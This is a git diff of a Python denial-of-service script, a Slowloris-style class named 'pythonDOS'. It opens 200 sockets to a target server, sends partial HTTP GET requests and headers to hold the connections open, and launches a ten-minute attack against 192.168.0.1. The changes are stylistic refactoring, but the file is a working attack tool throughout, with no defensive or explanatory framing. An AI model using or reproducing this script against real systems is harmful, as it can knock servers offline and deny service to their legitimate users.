@@ -1,12 +1,15 @@
 # Import dependencies
-import socket, random, time, sys
+import socket
+import random
+import time
+import sys
 
 
 # Class definition
 class pythonDOS():
 
     # Class init function, initialize object, use default values on the initialize to keep it simple on production
-    def __init__(self, ip, port=80, socketsCount = 200):
+    def __init__(self, ip, port=80, socketsCount=200):
         self._ip = ip
         self._port = port
         self._headers = [
@@ -14,6 +17,7 @@ class pythonDOS():
             "Accept-Language: en-us,en;q=0.5"
         ]
         self._sockets = [self.newSocket() for _ in range(socketsCount)]
+        self.encode = "utf-8"
 
     # Function to create new sockets, each socket is a connection
     def newSocket(self):
@@ -23,7 +27,7 @@ class pythonDOS():
             s.connect((self._ip, self._port))
             s.send(self.getMessage("Get /?"))
             for header in self._headers:
-                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
+                s.send(bytes(bytes("{}\r\n".format(header).encode(self.encode))))
             return s
         except socket.error as se:
             print("Error: "+str(se))
@@ -32,7 +36,7 @@ class pythonDOS():
 
     # Create the message requested to target server
     def getMessage(self, message):
-        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")
+        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode(self.encode)
 
     # Attack function, sends all sockets (default 200) to target
     def attack(self, timeout=sys.maxsize, sleep=15):
@@ -49,10 +53,11 @@ class pythonDOS():
                     self._sockets.append(self.newSocket())
                 time.sleep(sleep/len(self._sockets))
 
+
 # Main function
 if __name__ == "__main__":
     # Create object with sockets
-    dos = pythonDOS("192.168.0.1", 81, socketsCount=200)
+    dos = pythonDOS("192.168.0.1", 80, socketsCount=200)
 
     # Start attack to target server
     dos.attack(timeout=60*10)
